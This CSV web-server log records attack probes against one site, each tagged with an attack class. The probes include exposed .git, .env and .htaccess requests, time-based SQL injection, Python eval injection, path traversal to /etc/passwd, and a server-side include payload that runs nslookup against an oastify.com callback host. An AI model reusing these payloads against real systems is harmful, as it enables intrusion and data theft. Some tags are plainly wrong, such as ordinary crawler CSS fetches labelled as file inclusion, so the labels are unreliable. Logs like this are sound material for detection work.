timestamp,ip,method,url,status,attack_type,user_agent
2025-05-22 06:11:01,49.43.160.88,GET,/.git/hooks/pre-applypatch,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,49.43.160.88,GET,/.git/hooks/pre-receive,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,49.43.160.88,GET,/.git/hooks/pre-commit,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,49.43.160.88,GET,/.git/info/attributes,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,49.43.160.88,GET,/.git/index,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,49.43.160.88,GET,/.git/info/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,49.43.160.88,GET,/.git/hooks/update,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,49.43.160.88,GET,/.git/info/refs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,49.43.160.88,GET,/.git/hooks/prepare-commit-msg,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:03,49.43.160.88,GET,/.git/info/exclude,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:03,49.43.160.88,GET,/.git/logs/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,49.43.160.88,GET,/.git/logs/head,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,49.43.160.88,GET,/.git/logs/refs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,49.43.160.88,GET,/.git/logs/refs/heads,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,49.43.160.88,GET,/.git/logs/refs/remotes/origin,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,49.43.160.88,GET,/.git/logs/HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,49.43.160.88,GET,/.git/logs/refs/remotes,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,49.43.160.88,GET,/.git/logs/refs/heads/master,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,49.43.160.88,GET,/.git/logs/refs/remotes/origin/HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,49.43.160.88,GET,/.git/objects/info/packs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,49.43.160.88,GET,/.git/packed-refs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,49.43.160.88,GET,/.git/refs/heads,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,49.43.160.88,GET,/.git/refs/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,49.43.160.88,GET,/.git/refs/heads/master,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,49.43.160.88,GET,/.git/objects/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,49.43.160.88,GET,/.git/logs/refs/remotes/origin/master,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,49.43.160.88,GET,/.git/refs/remotes,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,49.43.160.88,GET,/.git/COMMIT_EDITMSG,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:07,49.43.160.88,GET,/.git/refs/remotes/origin,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:07,49.43.160.88,GET,/.git/refs/remotes/origin/HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:07,49.43.160.88,GET,/.git/refs/remotes/origin/master,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:07,49.43.160.88,GET,/.git/refs/tags,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:12,49.43.160.88,GET,/.gitlab-ci/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:18,173.239.196.13,POST,/Photo-Gallery'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:11:37,49.43.160.88,GET,/.htaccess,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:40,49.43.160.88,GET,/.htaccess-dev,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,49.43.160.88,GET,/.htaccess-local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,49.43.160.88,GET,/.htaccess.BAK,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,49.43.160.88,GET,/.htaccess-marco,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,49.43.160.88,GET,/.htaccess.bak,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,49.43.160.88,GET,/.htaccess.bak1,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,49.43.160.88,GET,/.htaccess.inc,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,49.43.160.88,GET,/.htaccess.old,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,49.43.160.88,GET,/.htaccess.orig,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,49.43.160.88,GET,/.htaccess.sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,49.43.160.88,GET,/.htaccess.save,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,49.43.160.88,GET,/.htaccess.txt,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,49.43.160.88,GET,/.htaccess_extra,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,49.43.160.88,GET,/.htaccess/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,49.43.160.88,GET,/.htaccess_orig,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,49.43.160.88,GET,/.htaccess_sc,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:44,49.43.160.88,GET,/.htaccessBAK,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:44,49.43.160.88,GET,/.htaccessOLD2,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:44,49.43.160.88,GET,/.htaccessOLD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:44,49.43.160.88,GET,/.htaccess~,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:47,173.239.196.9,POST,/Photo-Gallery'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:12:03,49.43.160.88,GET,/.git/config,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.3"
2025-05-22 06:12:09,49.43.160.88,GET,/favicon.ico,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.3"
2025-05-22 06:12:16,173.239.196.10,POST,/Photo-Gallery'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:12:39,173.239.196.13,POST,/Photo-Gallery%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:13:17,173.239.196.11,POST,/Photo-Gallery'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:13:53,173.239.196.10,POST,/Photo-Gallery')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:14:25,173.239.196.14,POST,/Photo-Gallery'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:14:53,173.239.196.11,POST,/Photo-Gallery'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:15:28,173.239.196.14,POST,/Photo-Gallery'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:16:05,173.239.196.9,POST,/Photo-Gallery'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:16:46,173.239.196.11,POST,/Photo-Gallery')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:17:27,173.239.196.11,POST,/Photo-Gallery'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:21:41,173.239.196.14,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:22:09,173.239.196.14,GET,/public/frontend/template/css/fonts/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:22:43,173.239.196.9,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'.sleep(20).'?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:23:12,173.239.196.9,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2%7b$%7bsleep(20)%7d%7d?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:27:07,173.239.196.12,POST,/Photo-Gallery'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:27:40,173.239.196.14,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:28:20,173.239.196.15,POST,/Photo-Gallery'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:28:53,173.239.196.9,POST,/Photo-Gallery%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:30:18,192.241.173.151,GET,/.env,200,Sensitive Data Exposure Probe,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);
2025-05-22 06:30:19,192.241.173.151,GET,/.env,400,Sensitive Data Exposure Probe,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);
2025-05-22 06:30:21,192.241.173.151,GET,/.git/config,200,Sensitive Data Exposure Probe,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);
2025-05-22 06:30:22,192.241.173.151,GET,/.git/config,400,Sensitive Data Exposure Probe,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);
2025-05-22 06:36:45,173.239.196.9,GET,/public/frontend/template/css/fonts/../../../../../../../../../../../../../../../../windows/win.ini?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:38:02,173.239.196.13,GET,/public/frontend/template/css/fonts/../../../../../../../../../../../../../../../../winnt/win.ini?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:40:02,173.239.196.13,POST,/../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:40:42,173.239.196.14,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:41:20,173.239.196.14,POST,/Photo-Gallery../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:41:21,69.171.249.1,GET,/robots.txt,206,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 06:41:50,173.239.196.11,POST,/../../../../../../../../../../../../../../../../etc/passwd%00Photo-Gallery,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:43:56,173.239.196.12,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2../../../../../../../../../../../../../../../../windows/win.ini?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:45:07,173.239.196.9,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2../../../../../../../../../../../../../../../../winnt/win.ini?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:45:40,173.239.196.15,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22gvy%22%20value%3d%22fuxifd0ard%22--%3e%3c!--%23set%20var%3d%22ix0%22%20value%3d%22hwzkhf2ctf%22--%3e%3c!--%23echo%20var%3d%22gvy%22--%3e%3c!--%23echo%20var%3d%22ix0%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%202hk520nxe0ak9df8son0dmvkabg440ssqgh84ysn.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:47:08,173.239.196.10,GET,/public/frontend/template/css/fonts/../../../../../../../../../../../../../../../../etc/passwd?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:48:13,173.239.196.14,GET,/public/frontend/template/css/fonts//etc/passwd?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:48:45,173.239.196.13,GET,/public/frontend/template/css/fonts/file%3a///etc/passwd?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:49:15,173.239.196.10,GET,/public/frontend/template/css/fonts/..././..././..././..././..././..././..././..././..././..././etc/passwd?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:50:37,173.239.196.10,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2../../../../../../../../../../../../../../../../etc/passwd?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:51:08,173.239.196.15,GET,/public/frontend/template/css/fonts/../../../../../../../../../../../../../../../../etc/passwd%00fontawesome-webfont.woff2?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:54:51,173.239.196.9,GET,/public/frontend/template/css/fonts/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22kw3%22%20value%3d%22jv2mgh1esh%22--%3e%3c!--%23set%20var%3d%22my5%22%20value%3d%22lx4oij3guj%22--%3e%3c!--%23echo%20var%3d%22kw3%22--%3e%3c!--%23echo%20var%3d%22my5%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%206ip934o1f4boahgctso4eqwobfh850tsrgi85ytn.oastify.com%22%20--%3e?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 07:07:08,217.154.79.204,POST,/wp-admin/admin-ajax.php,404,Broken Access Control (Forced Browsing),"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) V"
2025-05-22 07:07:10,217.154.79.204,POST,/wp-admin/admin-ajax.php?action=uploadFontIcon,404,Broken Access Control (Forced Browsing),"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) V"
2025-05-22 07:32:26,54.197.80.119,GET,/.git/config,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Raspbian Chromium/72.0.3626.1"
2025-05-22 07:36:43,17.241.219.149,GET,/public/frontend/template/css/animate.min.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:44,17.241.227.49,GET,/public/frontend/template/css/bootstrap.min.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:44,17.241.219.94,GET,/public/frontend/template/css/styles-desktop.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:45,17.241.219.206,GET,/public/frontend/template/parallax-slider/css/parallax-slider.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:45,17.241.75.123,GET,/public/frontend/template/css/style.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:46,17.241.75.196,GET,/public/frontend/template/css/styles-base.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:46,17.241.219.94,GET,/public/frontend/template/css/components.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:46,17.241.219.149,GET,/public/frontend/template/css/shared.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:47,17.241.219.206,GET,/public/frontend/template/css/font-awesome.min.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:47,17.241.219.94,GET,/public/frontend/template/css/jquery.fancybox.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
